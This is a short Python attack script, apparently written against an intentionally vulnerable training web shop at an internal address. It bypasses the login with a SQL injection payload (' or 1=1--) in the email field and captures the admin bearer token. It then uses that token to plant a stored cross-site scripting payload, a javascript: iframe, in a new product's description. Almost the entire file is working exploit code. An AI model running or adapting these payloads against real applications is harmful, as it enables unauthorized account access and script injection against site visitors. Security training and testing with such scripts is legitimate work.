import requests


def perform_xss(url: str, port=80):
    final_url = url + ':' + str(port) + '/rest/user/login'
    post_data = {"email": "' or 1=1--", "password": "admin123"}
    response = requests.post(final_url, data=post_data)
    if response.status_code == 200:
        json = response.json()
        token = json['authentication']['token']
    else:
        raise requests.exceptions.BaseHTTPError(f'HTTP error {response.status_code}')
    post_data = {"name": "XSS", "description": "<iframe src=\"javascript:alert(xss)\">", "price": 47.11}
    final_url = url + ':' + str(port) + '/api/Products'
    json = {'Authorization': 'Bearer ' + token}
    response = requests.post(final_url, data=post_data, headers=json)
    print(response)


if __name__ == '__main__':
    perform_xss('http://10.96.0.42', port=80)
